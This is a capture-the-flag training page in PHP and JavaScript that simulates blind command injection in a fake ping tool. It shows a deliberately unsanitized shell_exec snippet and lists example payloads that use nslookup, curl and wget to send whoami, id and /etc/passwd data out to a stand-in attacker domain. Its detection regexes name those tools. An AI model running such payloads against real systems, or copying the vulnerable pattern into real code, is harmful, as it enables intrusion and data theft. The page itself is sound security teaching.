<?php
$challenge_flag = get_ctf_flag_map()['blind'] ?? '';
?>
<div class="max-w-6xl mx-auto animate-fade-in-up">

    <div class="mb-10">
        <a href="/ctf" class="text-neutral-500 hover:text-white text-sm mb-4 inline-flex items-center gap-1">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
            Back to Mission Control
        </a>
        <h1 class="text-3xl font-bold text-white mb-2">Blind Command Injection</h1>
        <p class="text-neutral-400">No response body. Exfiltrate data using out-of-band DNS callbacks.</p>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">

        <!-- Brief + OAST Listener -->
        <div class="lg:col-span-1 space-y-5">
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-4">Mission Brief</h3>
                <p class="text-sm text-neutral-300 leading-relaxed mb-4">
                    A vulnerable network diagnostic tool passes user input unsanitized to <code class="text-red-400">shell_exec()</code>. No output is returned to the browser — you must exfiltrate data via <strong class="text-white">out-of-band DNS callbacks</strong>.
                </p>
                <p class="text-sm text-neutral-300 leading-relaxed mb-4">
                    Inject a payload that causes the server to resolve a DNS name you control. The subdomain encodes the exfiltrated data.
                </p>
                <div class="bg-neutral-900 border border-neutral-800 rounded-lg p-3 font-mono text-[11px]">
                    <div class="text-neutral-500">// Vulnerable code (server-side)</div>
                    <div class="text-red-400 mt-1">shell_exec("ping -c1 ".$_POST['host']);</div>
                </div>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">OAST Listener</h3>
                <div class="space-y-1 text-xs font-mono mb-3">
                    <div class="text-neutral-500">Your interaction domain:</div>
                    <div class="text-blue-400 bg-black border border-neutral-800 rounded px-2 py-1 break-all">attacker.oast.pro</div>
                </div>
                <div id="oastLog" class="bg-black border border-neutral-800 rounded-lg p-3 font-mono text-xs min-h-[80px] space-y-1">
                    <div class="text-neutral-700">// No callbacks yet...</div>
                </div>
            </div>

            <div class="border border-neutral-800 bg-neutral-950 rounded-xl p-6">
                <h3 class="text-xs font-bold text-neutral-500 uppercase tracking-wider mb-3">Payload Examples</h3>
                <div class="space-y-2 text-xs font-mono text-neutral-500">
                    <div class="bg-black p-2 rounded border border-neutral-800 leading-relaxed text-neutral-400 break-all">; nslookup $(whoami).attacker.oast.pro</div>
                    <div class="bg-black p-2 rounded border border-neutral-800 leading-relaxed text-neutral-400 break-all">| curl http://$(id).attacker.oast.pro</div>
                    <div class="bg-black p-2 rounded border border-neutral-800 leading-relaxed text-neutral-400 break-all">`wget http://attacker.oast.pro/$(cat /etc/passwd|md5sum)`</div>
                </div>
            </div>
        </div>

        <!-- Vulnerable App + Result -->
        <div class="lg:col-span-2 space-y-4">

            <!-- Fake Admin Panel -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden shadow-xl">
                <div class="bg-neutral-900 border-b border-neutral-800 p-3 flex items-center gap-4">
                    <div class="flex gap-1.5 ml-1">
                        <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
                        <div class="w-2.5 h-2.5 rounded-full bg-yellow-500/60"></div>
                        <div class="w-2.5 h-2.5 rounded-full bg-green-500/60"></div>
                    </div>
                    <div class="flex-grow text-center text-xs text-neutral-500 font-mono">internal-tools.plexaur.ctf/diagnostics</div>
                </div>

                <div class="bg-neutral-900/30 p-8">
                    <div class="max-w-md mx-auto">
                        <div class="mb-2 flex items-center gap-2">
                            <div class="w-6 h-6 bg-neutral-800 rounded flex items-center justify-center">
                                <svg class="w-3.5 h-3.5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18"/></svg>
                            </div>
                            <span class="text-sm font-semibold text-white">Network Diagnostic Tool</span>
                            <span class="ml-auto text-[10px] px-2 py-0.5 bg-red-900/40 text-red-400 border border-red-800/50 rounded font-mono">ADMIN PANEL</span>
                        </div>
                        <p class="text-xs text-neutral-500 mb-5">Ping a target host to verify connectivity. Results are logged internally.</p>

                        <div class="mb-4">
                            <label class="block text-xs font-bold text-neutral-500 uppercase tracking-wider mb-1">Target Host / IP</label>
                            <input type="text" id="hostInput" value="8.8.8.8"
                                class="w-full bg-black border border-neutral-700 rounded-lg px-4 py-2.5 text-white font-mono text-sm focus:outline-none focus:border-white transition-colors">
                        </div>

                        <button onclick="runDiagnostic()"
                            class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 rounded-lg text-sm transition-colors">
                            Run Ping
                        </button>
                    </div>
                </div>
            </div>

            <!-- Response Log -->
            <div class="border border-neutral-800 bg-neutral-950 rounded-xl overflow-hidden shadow-xl">
                <div class="bg-neutral-900 border-b border-neutral-800 px-4 py-2 flex items-center gap-2">
                    <div id="respDot" class="w-2 h-2 rounded-full bg-neutral-600 transition-colors"></div>
                    <span class="text-xs text-neutral-500 font-mono">server-response</span>
                </div>
                <pre id="respLog" class="bg-black p-4 font-mono text-xs text-neutral-500 min-h-[90px] whitespace-pre-wrap"><span class="text-neutral-700">// No request sent yet...</span></pre>
            </div>

            <!-- Flag Reveal -->
            <div id="flagReveal" class="hidden border border-green-900/50 bg-green-900/10 rounded-xl p-5">
                <div class="flex items-center gap-3 mb-3">
                    <div class="w-8 h-8 bg-green-500/20 rounded-full flex items-center justify-center text-green-400 shrink-0">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <div>
                        <div class="text-green-400 font-bold text-sm">Out-of-Band Exfiltration Complete</div>
                        <div class="text-neutral-400 text-xs mt-0.5">DNS callback received. Submit the flag at Mission Control.</div>
                    </div>
                </div>
                <div class="bg-black border border-green-900/50 rounded-lg px-4 py-3 font-mono text-green-400 text-sm tracking-wide select-all">
                    <?= htmlspecialchars($challenge_flag) ?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function isOASTPayload(val) {
    const hasInjectionOp = /[;|`]|\$\(/.test(val);
    const hasOASTTool    = /nslookup|curl|wget|ping\s+-c/.test(val.toLowerCase());
    const hasDomain      = /attacker\.oast\.pro|burpcollaborator|interactsh|oast\.(pro|me|fun)/.test(val.toLowerCase());
    return hasInjectionOp && hasOASTTool && hasDomain;
}

function isBasicInjection(val) {
    // Accept any semicolon/pipe + known exfil tool even without the specific domain
    return /[;|`]|\$\(/.test(val) && /nslookup|curl|wget/.test(val.toLowerCase());
}

async function runDiagnostic() {
    const host = document.getElementById('hostInput').value.trim();
    const log  = document.getElementById('respLog');
    const dot  = document.getElementById('respDot');
    const oast = document.getElementById('oastLog');

    const isOAST  = isOASTPayload(host);
    const isInject = isBasicInjection(host);
    const isSafe   = !isInject;

    dot.className = 'w-2 h-2 rounded-full bg-yellow-400 animate-pulse transition-colors';
    log.innerHTML = `<span class="text-blue-400">[*] Sending ping request for: ${escHtml(host)}</span>`;
    await sleep(500);
    log.innerHTML += `\n<span class="text-neutral-400">[*] Executing: shell_exec("ping -c1 ${escHtml(host)}")</span>`;
    await sleep(800);

    if (isSafe) {
        log.innerHTML += `\n<span class="text-neutral-400">PING ${escHtml(host)} 56 data bytes</span>`;
        log.innerHTML += `\n<span class="text-neutral-400">64 bytes from ${escHtml(host)}: icmp_seq=0 ttl=64 time=1.42 ms</span>`;
        log.innerHTML += `\n<span class="text-neutral-500">\n1 packets transmitted, 1 received, 0% packet loss</span>`;
        dot.className = 'w-2 h-2 rounded-full bg-neutral-500 transition-colors';
        return;
    }

    // Injection detected — no output returned
    log.innerHTML += `\n<span class="text-neutral-500">[*] Command dispatched — no output returned (blind).</span>`;
    await sleep(600);

    if (!isOAST) {
        log.innerHTML += `\n<span class="text-yellow-400">[!] Injection detected but no OAST domain found in payload.</span>`;
        log.innerHTML += `\n<span class="text-neutral-500">Tip: Use attacker.oast.pro as your interaction domain to receive DNS callbacks.</span>`;
        dot.className = 'w-2 h-2 rounded-full bg-yellow-500 transition-colors';
        return;
    }

    // OAST callback simulation
    await sleep(800);
    const uid = 'root(uid=0)';
    const subdomain = uid + '.attacker.oast.pro';
    oast.innerHTML = `<span class="text-yellow-400">[${new Date().toISOString()}] DNS Query received</span>`;
    await sleep(300);
    oast.innerHTML += `\n<span class="text-green-400">A ${subdomain}</span>`;
    await sleep(300);
    oast.innerHTML += `\n<span class="text-green-400">From: 10.10.15.3 (target server)</span>`;
    await sleep(400);

    log.innerHTML += `\n<span class="text-green-400">[✓] OAST DNS interaction captured from target server!</span>`;
    log.innerHTML += `\n<span class="text-green-400">[✓] Exfiltrated data encoded in DNS subdomain: ${escHtml(subdomain)}</span>`;
    await sleep(400);
    log.innerHTML += `\n<span class="text-green-500">[✓] Out-of-band exfiltration confirmed — RCE verified.</span>`;

    dot.className = 'w-2 h-2 rounded-full bg-green-500 transition-colors';
    document.getElementById('flagReveal').classList.remove('hidden');
}

function escHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
</script>
